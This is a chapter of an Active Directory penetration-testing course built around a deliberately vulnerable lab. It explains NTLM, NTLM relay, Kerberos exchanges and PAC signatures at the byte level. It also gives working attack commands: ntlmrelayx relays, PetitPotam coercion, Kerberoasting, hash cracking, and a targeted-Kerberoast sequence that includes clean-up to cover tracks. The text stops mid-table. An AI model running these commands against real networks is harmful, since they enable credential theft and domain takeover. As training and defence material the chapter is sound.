# 05 — Authentication Protocols: NTLM and Kerberos in Depth

Every interesting Active Directory attack manipulates an authentication
protocol. You cannot exploit what you cannot read on the wire, and you cannot
read what you have not first internalised at the byte level. This chapter is
therefore deliberately RFC-deep. Read slowly. Re-read sections that confuse
you. Where ASCII diagrams appear, copy them onto paper and trace the keys.

We cover:

- **LM** — historical, broken, often still computed by accident.
- **NTLM** — NTLMv1, NTLMv2, Net-NTLMv1/v2 over the wire.
- **NTLM relay** — what it is, the relay landscape, what defends against it.
- **Kerberos v5** — AS exchange, TGS exchange, AP exchange.
- **PAC** — the Privilege Attribute Certificate, the heart of ticket forgery.
- **S4U2Self / S4U2Proxy / RBCD** — delegation flows.
- **PKINIT, FAST, U2U, referrals** — the corners that enable modern attacks.
- **Golden / Silver / Diamond / Sapphire** ticket anatomy.
- **Time, ccache, KRB5CCNAME** — the operational plumbing.

This chapter is the spine of chapters 09 (initial access), 10 (credential
access), 11 (lateral movement), 12 (persistence and forest pivots) and 13
(detection). Master it once, refer back forever.

---

## 5.0 (Context) Why authentication is a chapter, not a paragraph

A naive view of authentication is "the password is sent and checked." Every
non-trivial system rejects that view, because:

1. **Wire confidentiality** is not guaranteed. Send the password and any tap
   on the cable steals it.
2. **Server breach** must not equal **user breach**. A server's database
   must not contain anything that grants direct logon as the user.
3. **Mutual authentication** is sometimes required. The user wants to know
   they're talking to the real server, not a spoofed one.
4. **Replay** must be prevented. An attacker who watches one auth must not
   be able to replay the captured bytes against the same or another server.
5. **Single sign-on** is desirable. The user types the password once, the
   system carries proofs around for the rest of the session.
6. **Delegation** is sometimes required: a service must act on the user's
   behalf to another service, without re-prompting.

Each of these constraints shapes the protocol. NTLM, designed in the 1990s,
solved (1) (2) (4) imperfectly. Kerberos, retrofitted from MIT, solved them
better and added (3) (5) (6). The cost was complexity. Every attack we will
study lives in the cracks of that complexity — preauth that can be turned
off, encryption types that can be downgraded, PACs that can be re-signed,
delegation flags that can be repurposed.

A protocol's vulnerabilities are usually not bugs. They are **features used
in ways the designer did not anticipate**. To attack AD, you must out-think
the designer. To defend AD, you must know which features remain dangerous
even after a quarter-century of patches.

---

## 5.1 (Concept) Where the password goes — never the wire

Every modern auth protocol's job is to prove "I know the password" without
ever sending the password. Passwords are converted into one-way derivatives
(hashes) or symmetric keys, and those derivatives sign or encrypt challenges
and tickets.

So when we talk about "credentials" in attacks, we usually mean one of:

- The **plaintext password** (sometimes recoverable, sometimes phished).
- The **LM hash** (legacy, almost-never present on modern boxes).
- The **NT hash** — `MD4(UTF-16-LE(password))` — usable for NTLM auth and
  as the RC4 Kerberos key.
- The **AES128 / AES256 Kerberos keys** — PBKDF2(SHA-1, password, salt,
  4096) — usable for AES Kerberos preauth and ticket encryption.
- A **Kerberos TGT** — a ticket-granting ticket; not a key, but possession
  lets you act as the user until expiry.
- A **Kerberos TGS** for a specific service — possession lets you talk to
  that one service as the user.
- A **certificate + private key** (PKINIT) — authenticates as the cert
  subject without ever knowing the password.
- A **DPAPI master key** — decrypts blob credentials stored on disk
  (browser passwords, RDP saved creds, scheduled-task creds).

All of these are "credentials" in the operator sense. Credential access in
ATT&CK terminology is the category of techniques that obtain them. You
will spend many hours of DVAD with the **credential triangle** in mind:

```
                  +----------------+
                  | plaintext      |
                  |   password     |
                  +----------------+
                   /              \
        +-------- /                \ -----------+
        |        v                  v           |
+----------------+              +----------------+
|    NT hash     |              |  AES keys      |
| (NTLM / RC4)   |              | (Kerberos AES) |
+----------------+              +----------------+
        |                                      |
        v                                      v
   Pass-the-hash                          Pass-the-key
   NTLM relay                             Overpass-the-hash
   Kerberoast (RC4)                       Kerberoast (AES, slower)
        \                                      /
         \--------\                /----------/
                   v              v
              +--------------------+
              | Tickets (TGT, TGS) |
              +--------------------+
                   |
                   v
              Pass-the-ticket
```

A great many DVAD flags live somewhere on this triangle. Knowing where you
sit on it — and what conversions are available — is half the operator's
mental model.

---

## 5.2 (Mechanics) LM and the NT hash

### LM hash (don't use; here for history)

DES-based, splits password into two 7-byte halves, weaknesses: case-
insensitive, max 14 chars, no salt. By 2010 it's rainbow-table crackable in
minutes.

```
LM("Password") =
  upper("Password") -> "PASSWORD"
  pad/truncate to 14 bytes, split into 7+7 halves
  half1 = "PASSWOR"
  half2 = "D      "
  k1 = str_to_key(half1)        # 56 -> 64 bit DES key with parity
  k2 = str_to_key(half2)
  out = DES_ECB(k1, b"KGS!@#$%") || DES_ECB(k2, b"KGS!@#$%")
```

Modern Windows disables LM hash storage by default (`NoLMHash=1`), but some
legacy auth flows still compute it ephemerally. Confirm via
`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash`. In DVAD, no user has
a stored LM hash, so secretsdump output for the LM column is always
`aad3b435b51404eeaad3b435b51404ee` — the well-known **empty-LM** constant
for blank input. Memorise that byte string; in a real engagement, seeing it
means LM storage is off (good) and seeing anything else means LM is still
being computed and that account's password is < 14 chars.

### NT hash

```
NT(password) = MD4(UTF-16-LE-encode(password))
```

That's it. **No salt.** Two users with the same password have the same NT
hash. The NT hash is what's stored in the SAM/NTDS (encrypted at rest with
the SYSKEY and per-user RC4 wrapping), and it's directly usable as a key
for NTLM auth and as the RC4 Kerberos key.

```
python3 -c '
import hashlib, sys
pw="Password1!"
print(hashlib.new("md4", pw.encode("utf-16-le")).hexdigest())
'
# a4f49c406510bdcab6824ee7c30fd852
```

You can do **pass-the-hash** with this directly. You'll never need plaintext
to authenticate to NTLM endpoints or to request Kerberos tickets with RC4.

**Practical note on encoding bugs.** Python 3 hashlib refuses MD4 in some
distros; you need `pip install pycryptodome` and `from Crypto.Hash import
MD4`. impacket's `hashes.py` has a helper, and `Get-NTHash` in PowerShell
modules like DSInternals will compute it directly.

### NT hash vs Net-NTLMv2 — the confusion that wastes weeks

Beginners constantly confuse these two and try to "pass the Net-NTLMv2".
You cannot. Net-NTLMv2 is a **challenge-response transcript**; it's only
usable for crack-it-offline or relay-it-live, never for a fresh logon to a
third party. The NT hash is the long-term derivative; the Net-NTLMv2 hash
is an ephemeral output. Beginners who treat them interchangeably hit a wall
trying to feed Responder output into `psexec.py -hashes`. They are different
things.

A useful test: ask "does this hash include a server-supplied challenge?" If
yes, it's Net-NTLMv1/v2, only crackable. If no, it's the stored NT hash and
you can pass it.

---

## 5.3 (Mechanics) NTLM authentication on the wire

NTLM is a challenge-response protocol. Three messages over the chosen
transport (SMB, HTTP/Negotiate, LDAP, MSSQL, MS-RPC, etc.):

```
Client                                                Server
  |  NEGOTIATE (flags)                                  |
  |---------------------------------------------------> |
  |                                                     |
  |              CHALLENGE (8-byte nonce, server flags, target info)
  |<--------------------------------------------------- |
  |                                                     |
  |  AUTHENTICATE (response, username, domain, hostname)|
  |---------------------------------------------------> |
  |                                                     |
  |    Server validates the response against its store  |
  |    or relays to a DC via NETLOGON                   |
  |                                                     |
  |   ACK / FAIL                                        |
  |<--------------------------------------------------- |
```

The **response** is what gets cracked when collected by Responder.

### NTLMSSP message structures (MS-NLMP)

The three messages share a common header `NTLMSSP\x00` followed by a 4-byte
message-type integer:

```
NEGOTIATE_MESSAGE        type=1
CHALLENGE_MESSAGE        type=2
AUTHENTICATE_MESSAGE     type=3
```

Each carries `NegotiateFlags`, a 32-bit bitfield that includes:

- `NTLMSSP_NEGOTIATE_UNICODE` (use UTF-16-LE encoding for strings)
- `NTLMSSP_NEGOTIATE_SIGN` (request integrity)
- `NTLMSSP_NEGOTIATE_SEAL` (request confidentiality, i.e., encryption)
- `NTLMSSP_NEGOTIATE_NTLM` (use NTLMv1)
- `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` (use NTLMv2 / NTLMSSP-MIC)
- `NTLMSSP_REQUEST_TARGET` (server should send target name)
- `NTLMSSP_TARGET_TYPE_DOMAIN` / `NTLMSSP_TARGET_TYPE_SERVER`

The reason relay defences exist is that NTLM by default does **not** bind
the auth to the *channel* it's traveling over. Channel binding adds an
`AV_PAIR` element of type `MsvAvChannelBindings` to the AUTHENTICATE blob,
keyed to the TLS channel hash. Without it, an attacker can replay the auth
on a different transport. SMB signing and LDAP channel binding both rely
on the NTLMSSP_NEGOTIATE_SIGN flag and a derived session key (`SealKey` and
`SignKey`) to MAC each message.

### NetNTLMv1 (legacy)

Client computes: split NT hash into three 7-byte chunks (pad the last with
zeros), DES-encrypt the 8-byte server challenge with each → 24 bytes.
Crackable instantly if you know any one DES key (in fact, the third DES
key only has 16 bits of entropy because of the zero padding, so the third
block of the response is a 16-bit search). Tools like `crack.sh` accept
NetNTLMv1 captures and return the NT hash for a flat fee. Use
`LmCompatibilityLevel >= 3` to disable NTLMv1 acceptance.

A particularly nasty NTLMv1 variant is **NTLMv1 with ESS** (Extended Session
Security). When ESS is set in the AUTHENTICATE message, the client's
`LMChallengeResponse` is repurposed as an 8-byte client challenge that
combines with the server challenge to derive the actual challenge fed to
the DES blocks. This was meant to defend against pre-computed rainbow
tables. It does not defeat `crack.sh`'s GPU brute force, but it does mean
you must request NetNTLMv1 *without* ESS to maximise crack speed. Responder
has a `--lm` flag (`-lm`) that forces clients to downgrade. Most clients
honour it.

### NetNTLMv2 (modern)

```
NTOWFv2 = HMAC_MD5(NT_hash, UTF-16-LE(UPPERCASE(username) + domain))

blob = HMAC_MD5(NTOWFv2, server_challenge || temp)
       where temp = 0x01 0x01 0x00 0x00 0x00 0x00 0x00 0x00
                    || timestamp (8 bytes Windows FILETIME)
                    || client_challenge (8 bytes)
                    || 0x00 0x00 0x00 0x00
                    || target_info_AV_PAIRS
                    || 0x00 0x00 0x00 0x00

NTProofStr = HMAC_MD5(NTOWFv2, server_challenge || temp_minus_AVpairs)
NtChallengeResponse = NTProofStr || temp
```

You collect this on the wire. You **cannot replay** it (challenge is
server-chosen) but you can crack offline. The Responder dump format is:

```
alice::CORP:1122334455667788:5b8b34...:01010000...
       ^^^^   ^^^^^^^^^^^^^^^^ ^^^^^^^   ^^^^^^^^
       domain server-challenge ntproof   blob
```

Hashcat mode 5600 is NetNTLMv2:

```
hashcat -m 5600 hashes.txt rockyou.txt
hashcat -m 5600 hashes.txt -a 3 'DVAD?d?d?d?d!'      # mask attack
```

NetNTLMv2 is what Responder and ntlmrelayx dump. DVAD users have weak
passwords by design (`DVADlab2024!`, `Summer2024!`, `Welcome1`), so cracking
is feasible against rockyou with light rules.

### What's in target_info (AV_PAIRS)

The CHALLENGE message includes a list of AV_PAIR records (Attribute-Value
pairs) describing the server:

| AvId | Meaning |
|---|---|
| 1 | NetBIOS computer name |
| 2 | NetBIOS domain name |
| 3 | DNS computer name |
| 4 | DNS domain name |
| 5 | DNS tree name |
| 6 | Flags (MIC present, account constrained, etc.) |
| 7 | Timestamp (FILETIME) |
| 8 | Restrictions (single-host) |
| 9 | Target name (SPN-like) |
| 10 | Channel bindings (hash of TLS channel) |
| 0 | End-of-list marker |

These fields end up inside the response blob so cracked NetNTLMv2 has them
embedded. AvId 10 (Channel bindings) is what defeats relay-to-LDAPS when
the LDAP server enforces EPA (Extended Protection for Authentication).

---

## 5.4 (Mechanics) NTLM Relay — the protocol-agnostic exploit

If a victim authenticates to *you*, you don't have to crack — you can
**relay**. The attacker sits between victim and target:

```
victim ------ NEGOTIATE -------> attacker ------ NEGOTIATE ------> target
victim <----- CHALLENGE -------- attacker <----- CHALLENGE ------- target
victim ------ RESPONSE --------> attacker ------ RESPONSE -------> target
                                          <----- AUTH OK --------- target
```

The attacker uses the victim's challenge to drive a fresh session against
`target`, then takes over after auth succeeds. Important constraints:

- **Signing must not be required on the target.** SMB signing required →
  relay fails. LDAP signing required → relay fails. DVAD disables both
  signing requirements deliberately (the GPO `Microsoft network server:
  Digitally sign communications (always) = Disabled` and the registry
  values `LDAPServerIntegrity = 1`).
- **The relay target should be different from the auth source.** Cross-
  protocol relay (HTTP→SMB, HTTP→LDAP, SMB→LDAP) is the standard pattern.
  Same-protocol same-host relay (SMB→SMB to the same host) was killed by
  MS08-068 long ago.
- **Channel binding** on LDAPS prevents straightforward relay (cert is bound
  to the channel via AvId=10).

ntlmrelayx is the canonical tool. Targets:

```bash
# SMB relay -> ADMIN$ exec, dump SAM
ntlmrelayx.py -tf targets.txt -smb2support

# LDAPS -> grant RBCD on target computer to attacker-owned computer
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access \
              --escalate-user attacker -smb2support

# HTTP -> ADCS web enrollment (ESC8) — request cert as victim
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
              --adcs --template DomainController -smb2support

# SMB -> LDAP, add shadow credential on target
ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials \
              --shadow-target 'DC01$' -smb2support

# Relay -> dump LSA secrets (if relayed as admin)
ntlmrelayx.py -t smb://server01.corp.local --secrets-dump
```

DVAD IA-012, CRED-031, CRED-032 are textbook relay scenarios.

### The coercion problem

Relay needs the victim to authenticate. **Coercion** is the family of
techniques that make a victim authenticate to an attacker-controlled
endpoint. The canonical victims are domain controllers, because their
machine account is privileged (it's in `Domain Controllers` which grants
DCSync). The canonical coercion vectors:

| Coercer | RPC interface | Trigger | Patched |
|---|---|---|---|
| **PrinterBug / SpoolSample** | MS-RPRN | `RpcRemoteFindFirstPrinterChangeNotificationEx` | partially (KB5005010); requires spooler on |
| **PetitPotam** | MS-EFSR | `EfsRpcOpenFileRaw` etc. | KB5005413 disables some; full fix requires NTLM-relay-resistant config |
| **DFSCoerce** | MS-DFSNM | `NetrDfsRemoveStdRoot` | unpatched as of writing |
| **ShadowCoerce** | MS-FSRVP | `IsPathSupported` | partial |
| **PrivExchange** | EWS PushSubscription | Exchange-specific | Exchange security update |
| **MS-EVEN6 / WebDAV coercion** | various | uses WebDAV client | requires WebClient on victim |

Running PetitPotam:

```bash
# Force DC to authenticate to our IP via EfsRpcOpenFileRaw
python3 PetitPotam.py -u alice -p 'DVADlab2024!' -d corp.local \
        attacker-ip dc01.corp.local
```

The DC machine account `DC01$` opens an SMB connection to attacker-ip and
NTLM-authenticates. ntlmrelayx forwards that to `ldaps://dc02.corp.local`
with `--delegate-access` to drop RBCD on DC02, and you've taken over.

### Mitigations stack

1. **SMB signing required** on the target (kills SMB relay).
2. **LDAP signing required + channel binding** on DCs (kills LDAP/LDAPS
   relay).
3. **EPA** for HTTP endpoints that accept NTLM (kills ESC8 unless attacker
   strips EPA).
4. **Disable NTLM** (impossible in many shops).
5. **Disable WebClient service** to kill WebDAV-driven coercion.
6. **Patch coercion sinks** (KB5005413 for PetitPotam EFSR, etc.).
7. **Disable Spooler on DCs** (PrinterBug).
8. **NTLM auditing** via `Network security: Restrict NTLM` GPOs.
9. **`MachineAccountQuota = 0`** kills RBCD-via-LDAPS-relay (the attacker
   has nowhere to point delegation at).

---

## 5.5 (Concept) Kerberos — what problem it solves

Kerberos eliminates two NTLM weaknesses:

1. **No password derivative goes to the application server.** The server
   never sees anything that could be cracked into the user's password
   (in the well-behaved case — Kerberoast subverts this by giving you the
   service account's derivative). Compromising a member server does not
   yield user passwords.
2. **Mutual authentication.** The client also verifies the server is real
   (helpful against spoofed services that try to capture user credentials).
3. **Single sign-on with delegation.** The TGT can be used to obtain
   service tickets for many services in one session; constrained delegation
   chains can pass identity forward without password re-prompting.

The cost: complexity, and strict dependencies on time synchronization and
DNS.

The model is **tickets**. The user gets a TGT (Ticket-Granting Ticket) from
the KDC once per session, then exchanges it for TGS (Ticket-to-Service)
tickets each time they need a new service. Tickets are short-lived
(default 10h for TGTs, configurable; the renew-till caps how long it can
be refreshed).

Kerberos's threat model assumes:

- An attacker can sniff but not modify packets without detection
  (preauth + checksums in tickets).
- An attacker who steals the KDC's database has won (krbtgt key compromise
  = forge any TGT).
- An attacker who steals a service's key has won for *that service*
  (Silver Ticket).
- The client and server have synchronised clocks within a small window.

DVAD breaks every assumption in turn.

---

## 5.6 (Mechanics) Kerberos cast of characters

- **Client / Principal** — the user (`alice@CORP.LOCAL`). Realm names are
  by convention uppercase versions of the DNS domain.
- **KDC (Key Distribution Center)** — the DC. Composed of two services:
  - **AS (Authentication Server)** — issues TGTs.
  - **TGS (Ticket-Granting Service)** — issues service tickets.
- **Application service** — anything with an SPN (`cifs/file01.corp.local`,
  `MSSQLSvc/sql01.corp.local:1433`, `HTTP/sharepoint.corp.local`).
- **krbtgt** — special account whose key encrypts every TGT.
- **Service account key** — derived from the service account's password
  (or the computer's machine account password); encrypts the TGS for that
  service.
- **Inter-realm trust account** — a hidden krbtgt-like account per trust
  direction, e.g., `krbtgt/FINANCE.LOCAL@CORP.LOCAL` and
  `krbtgt/CORP.LOCAL@FINANCE.LOCAL`. Each has its own key, set from the
  trust password.

```
+--------+      +-----+      +--------+      +---------+
| Client |<---->|  AS |<---->|  TGS   |<---->| Service |
+--------+      +-----+      +--------+      +---------+
                |   ^                            ^
                |   |  encrypts/signs everything |
                +---+  with their respective keys+
                       (krbtgt key, service key)
```

Every Kerberos message is ASN.1 DER encoded and most fields are optional or
versioned. Read `kerberos.asn1` from MIT Kerberos sources alongside the
RFC if you want to write parsers; otherwise impacket's `KerberosTGT` and
`KerberosTGS` classes do the heavy lifting.

---

## 5.7 (Mechanics) The AS exchange (AS-REQ / AS-REP)

Goal: client obtains a TGT.

```
AS-REQ from alice -> KDC
{
  pvno: 5
  msg-type: AS-REQ (10)
  padata:
    PA-ENC-TIMESTAMP:
      encrypted with alice's key (RC4 or AES):
        contents: { timestamp, microseconds }
    PA-PAC-REQUEST: include-pac=TRUE
  req-body:
    kdc-options: forwardable, renewable, ...
    cname: alice@CORP.LOCAL
    realm: CORP.LOCAL
    sname: krbtgt/CORP.LOCAL
    from:  optional start time
    till:  expiry
    rtime: renew-till
    nonce: <random>
    etype: [AES256, AES128, RC4-HMAC]    (in preferred order)
    addresses: optional
    enc-authorization-data: optional
    additional-tickets: optional (used for U2U, S4U2Proxy)
}
```

The pre-auth timestamp proves "I know the password" to the KDC — only
someone with the correct key can encrypt a valid timestamp. The KDC checks
that the decrypted timestamp is within 5 minutes of its clock.

If the user has `DONT_REQ_PREAUTH` (`userAccountControl` bit 0x400000)
set, the timestamp is omitted. The KDC issues the AS-REP anyway. **The
AS-REP's encrypted part is encrypted with the user's key.** Capture it →
crack the user's password offline. That's **AS-REP roasting**.

```
AS-REP from KDC -> alice
{
  pvno: 5
  msg-type: AS-REP (11)
  crealm: CORP.LOCAL
  cname: alice
  ticket: TGT
    {
      tkt-vno: 5
      realm: CORP.LOCAL
      sname: krbtgt/CORP.LOCAL
      enc-part: encrypted with krbtgt key:
        EncTicketPart {
          flags, key (sk1 = session key), crealm, cname,
          transited, authtime, starttime, endtime, renew-till,
          caddr, authorization-data: PAC
        }
    }
  enc-part: encrypted with alice's key:
    EncASRepPart {
      key (sk1), last-req, nonce, key-expiration, flags,
      authtime, starttime, endtime, renew-till, srealm, sname
    }
}
```

Two important keys:

- **Alice's long-term key** (from her password) — decrypts the outer
  `enc-part`.
- **krbtgt's key** — KDC used it to encrypt the ticket. Alice cannot read
  inside the ticket; she just hands it back to the KDC later.

The **session key (sk1)** is the new symmetric secret shared between alice
and the KDC for the rest of this TGT.

### Why AS-REP roast is special

The KDC encrypts the outer enc-part with the user's key. If preauth is
required, the attacker never gets a fresh chosen-plaintext ciphertext for
the user's key. With preauth off, an unauthenticated attacker can send
arbitrary AS-REQs for that user and get back ciphertext to crack. Hence
DONT_REQ_PREAUTH is a high-value flag to identify in recon.

The cracked hash format (hashcat mode 18200):

```
$krb5asrep$23$user@DOMAIN.LOCAL:salt$ciphertext
        ^^   etype 23 = RC4-HMAC
```

For AES-only DONT_REQ_PREAUTH users, the format is `$krb5asrep$17$...`
(AES128) or `$18$...` (AES256); crackable with hashcat modes 19600/19700.
Cracking AES preauth blobs is markedly slower than RC4 because each guess
requires PBKDF2(SHA-1, 4096) iterations.

### The AS-REP flags field

Important Kerberos ticket flags (32-bit, RFC 4120 §5.3):

| Bit | Name | Meaning |
|---|---|---|
| 1 | FORWARDABLE | This TGT can be used to obtain forwarded TGTs to other realms. |
| 2 | FORWARDED | This ticket was forwarded. |
| 3 | PROXIABLE | TGS-REQs may request a TGS with a different network address. |
| 4 | PROXY | This is a proxy ticket. |
| 5 | MAY-POSTDATE | Postdated tickets may be requested using this TGT. |
| 6 | POSTDATED | This ticket is postdated. |
| 7 | INVALID | Ticket invalid (used for postdated until validated). |
| 8 | RENEWABLE | Renewable until `renew-till`. |
| 9 | INITIAL | This ticket came from the AS, not TGS (i.e., it's a TGT). |
| 10 | PRE-AUTHENT | Client was preauthenticated. |
| 11 | HW-AUTHENT | Hardware-token-backed preauth. |
| 14 | OK-AS-DELEGATE | Service is trusted to delegate. |

The `FORWARDABLE` flag is the gate for delegation: an unforwardable TGT
can't be used in S4U2Proxy to deliver across constrained delegation.
Sensitive accounts (`NOT_DELEGATED` UAC bit) get TGTs without
`FORWARDABLE`.

---

## 5.8 (Mechanics) The TGS exchange (TGS-REQ / TGS-REP)

Goal: client trades TGT for a service ticket.

```
TGS-REQ from alice -> KDC
{
  msg-type: TGS-REQ (12)
  padata:
    PA-TGS-REQ:
      AP-REQ:
        ticket: alice's TGT (encrypted with krbtgt key — KDC can decrypt)
        authenticator: { cname, timestamp } encrypted with sk1
  req-body:
    kdc-options: ...
    sname: cifs/file01.corp.local
    realm: CORP.LOCAL
    till: ...
    nonce: ...
    etype: [...]
    additional-tickets: optional (used for U2U, S4U2Proxy)
}
```

KDC decrypts TGT with krbtgt key → gets sk1 → decrypts authenticator →
verifies timestamp not stale → issues TGS.

```
TGS-REP from KDC -> alice
{
  msg-type: TGS-REP (13)
  crealm: CORP.LOCAL
  cname: alice
  ticket: TGS
    {
      tkt-vno: 5
      realm: CORP.LOCAL
      sname: cifs/file01.corp.local
      enc-part: encrypted with service account's key (FILE01$):
        EncTicketPart {
          flags, key (sk2), crealm, cname,
          authtime, starttime, endtime, renew-till,
          authorization-data: PAC
        }
    }
  enc-part: encrypted with sk1:
    EncTGSRepPart {
      key (sk2), last-req, nonce, flags, authtime, ..., srealm, sname
    }
}
```

The service account's key encrypts the TGS's enc-part. **This is exactly
what Kerberoasting exploits** — the ticket itself is encrypted with the
service account's password-derived key, so capturing it gives you something
to crack offline.

For RC4 tickets, the NT hash is the key directly. Crack the hash, you
recover the service account's NT hash; from there, crack to plaintext or
just pass-the-hash. Hashcat mode 13100:

```
hashcat -m 13100 kerb.hash rockyou.txt
```

For AES tickets, the AES256 key is `PBKDF2-HMAC-SHA1(password, salt, 4096)`
and cracking is PBKDF2-bound. Mode 19700 (TGS-REP AES256). Tooling:

```
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
        -request -outputfile kerb.hash
```

By default GetUserSPNs requests RC4 tickets if the service account
supports them — `msDS-SupportedEncryptionTypes` controls this. If AES-only
is enforced, you get an AES blob. Rubeus has `/rc4opsec` to *prefer* RC4
specifically, and `/aes256opsec` for AES256 — etype selection matters for
both detection profile and crack speed.

### Targeted Kerberoast

If you can set an SPN on a target user (via GenericWrite or the validated
write on `servicePrincipalName`), you can:

1. Set a fake SPN on the target.
2. Kerberoast that SPN.
3. Optionally remove the SPN to cover tracks.

```
bloodyAD --host dc01 -u alice -p 'DVADlab2024!' \
         set object 'CN=Bob,CN=Users,DC=corp,DC=local' \
         servicePrincipalName --add cifs/anything.corp.local
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
        -request-user bob -outputfile bob.hash
bloodyAD ... remove ... cifs/anything.corp.local
```

DVAD CRED-005 is targeted Kerberoast against a user where alice has
GenericWrite.

---

## 5.9 (Mechanics) The AP exchange (client → service)

```
Client -> Service:
  AP-REQ:
    ap-options: mutual-required, use-session-key
    ticket: TGS  (service decrypts with its own key)
    authenticator: { cname, timestamp, checksum } encrypted with sk2

Service -> Client (optional, mutual auth):
  AP-REP: { timestamp+1, sub-session-key } encrypted with sk2

(Then they use sk2 as a session key for further encryption/signing of
 app-layer traffic, e.g. SMB session signing or LDAP signing)
```

The service does **not** contact the KDC for normal validation. It just
decrypts the ticket with its own key (the machine account's key for
`cifs/HOST`, the service account's key for user-account SPNs), checks the
authenticator's timestamp against its clock (must be within ~5 minutes —
hence Kerberos's clock-sync dependency), and trusts the PAC inside.

This last point is what makes Golden Ticket so devastating: **the service
trusts what's in the PAC**, and the PAC is signed only by krbtgt (which
you have for Golden) and the service's key (which you also have for
Silver). When the service does not validate the PAC by callback to the
KDC, the only check is the cryptographic signature — which checks out if
you have the right key.

KB5020805 ("November 2022 cumulative") forces DCs to verify the new
**Extended PAC Signature** (KDC ticket signature plus an additional ticket
signature), making most Golden Ticket forgeries detectable when the
service is itself a DC. We cover the patch sequence in 5.10 and chapter 13.

---

## 5.10 (Mechanics) The PAC in detail

The PAC sits inside the ticket's `authorization-data` field, type 128
(`AD-WIN2K-PAC`). Structure (MS-PAC):

```
PAC_TYPE
  +- ulVersion = 0
  +- cBuffers = N
  +- Buffers[N]:
       +- ulType (e.g., 1=LOGON_INFO, 6=SERVER_CHECKSUM,
                       7=KDC_CHECKSUM, 10=CLIENT_INFO,
                       11=CONSTRAINED_DELEGATION,
                       12=UPN_DNS_INFO,
                       13=CLIENT_CLAIMS_INFO,
                       14=DEVICE_INFO,
                       15=DEVICE_CLAIMS_INFO,
                       16=TICKET_CHECKSUM,
                       19=EXTENDED_KDC_CHECKSUM)
       +- cbBufferSize
       +- Offset
+- BufferData ...
```

LOGON_INFO (the meaty buffer):

```
KERB_VALIDATION_INFO:
  LogonTime, LogoffTime, KickOffTime, PasswordLastSet,
  PasswordCanChange, PasswordMustChange
  EffectiveName: "alice"
  FullName: "Alice"
  LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive
  LogonCount, BadPasswordCount
  UserId (RID)
  PrimaryGroupId (RID)
  GroupCount, GroupIds[] (RIDs of memberOf groups)
  UserFlags
  UserSessionKey
  LogonServer (the issuing DC)
  LogonDomainName ("CORP")
  LogonDomainId (the domain SID prefix)
  Reserved...
  UserAccountControl
  SidCount, ExtraSids[] (cross-domain SID history!)
  ResourceGroupDomainSid, ResourceGroupCount, ResourceGroupIds[]
```

**ExtraSids is where SID history lives.** When you forge a ticket and want
cross-forest EA, you stuff `S-1-5-21-FINANCE-519` in ExtraSids. The
target-domain KDC, on cross-realm referral, then sees that the principal
"is also" a member of FINANCE Enterprise Admins.

**The PAC signatures evolution:**

- **Server checksum** (type 6) — HMAC over the PAC bytes computed with the
  *service account's* key (the same key that encrypts the ticket's
  enc-part). Allows the service to verify the PAC came from the KDC.
- **KDC checksum** (type 7) — HMAC over the server checksum with *krbtgt's*
  key. Allows the DC to verify the PAC's server checksum is authentic
  (when the service forwards it back via S4U2Self/Proxy).
- **Ticket checksum** (type 16, KB5008380, Nov 2021) — HMAC over the
  ticket's enc-part with the krbtgt key. Closes the Diamond Ticket bug
  where a real ticket's PAC could be swapped without invalidating any
  signature.
- **Extended KDC checksum** (type 19, KB5020805, Nov 2022) — krbtgt-keyed
  HMAC over the entire PAC including the new ticket checksum.

A **Golden Ticket** has the two classic signatures because the forger
knows krbtgt's key. After KB5020805, if the DC is patched and enforcing
("Audit" → "Enforced"), the DC also checks types 16 and 19; mimikatz
golden tickets generated by older versions fail because the new fields are
absent. mimikatz ≥ 2.2.0 #20221220 understands the new format.

A **Silver Ticket** forger doesn't know krbtgt's key — they only sign with
the service's key (type 6). Most services don't verify the KDC checksum
(it would require a callback to the DC) so Silver Tickets work fine
against most service endpoints — except the DCs themselves which do
validate against krbtgt.

### A worked PAC field — UserAccountControl

The PAC's `UserAccountControl` bits include:

| Bit | Name | Hex |
|---|---|---|
| 0 | SCRIPT | 0x1 |
| 1 | ACCOUNTDISABLE | 0x2 |
| 3 | HOMEDIR_REQUIRED | 0x8 |
| 4 | LOCKOUT | 0x10 |
| 5 | PASSWD_NOTREQD | 0x20 |
| 6 | PASSWD_CANT_CHANGE | 0x40 |
| 7 | ENCRYPTED_TEXT_PWD_ALLOWED | 0x80 |
| 8 | TEMP_DUPLICATE_ACCOUNT | 0x100 |
| 9 | NORMAL_ACCOUNT | 0x200 |
| 11 | INTERDOMAIN_TRUST_ACCOUNT | 0x800 |
| 12 | WORKSTATION_TRUST_ACCOUNT | 0x1000 |
| 13 | SERVER_TRUST_ACCOUNT | 0x2000 |
| 16 | DONT_EXPIRE_PASSWORD | 0x10000 |
| 17 | MNS_LOGON_ACCOUNT | 0x20000 |
| 18 | SMARTCARD_REQUIRED | 0x40000 |
| 19 | TRUSTED_FOR_DELEGATION | 0x80000 |
| 20 | NOT_DELEGATED | 0x100000 |
| 21 | USE_DES_KEY_ONLY | 0x200000 |
| 22 | DONT_REQ_PREAUTH | 0x400000 |
| 23 | PASSWORD_EXPIRED | 0x800000 |
| 24 | TRUSTED_TO_AUTH_FOR_DELEGATION | 0x1000000 |
| 25 | NO_AUTH_DATA_REQUIRED | 0x2000000 |
| 26 | PARTIAL_SECRETS_ACCOUNT | 0x4000000 (RODC) |

These are the same bits as the `userAccountControl` LDAP attribute, packed
into the PAC for the service to consult without an LDAP round-trip.

### UPN_DNS_INFO (PAC buffer type 12)

Contains the user's UPN (e.g., `alice@corp.local`) and the DNS domain
name. This is what PKINIT-issued tickets use to map cert SAN to AD
identity. When you forge tickets, this buffer must be present and
consistent for many service endpoints (Exchange, ADFS) to function.

### PAC_CREDENTIAL_INFO (PAC buffer type 2)

Carries the user's NTLM hash, encrypted with the session key. Used by
PKINIT to allow Windows NTLM-aware components to also impersonate as the
user. Certipy's `auth --getNThash` exploits this to recover the NT hash
after PKINIT-authenticating as a user.

---

## 5.11 (Mechanics) Encryption types

Kerberos packets reference an `etype` integer:

| Value | Name | Key derivation | Notes |
|---|---|---|---|
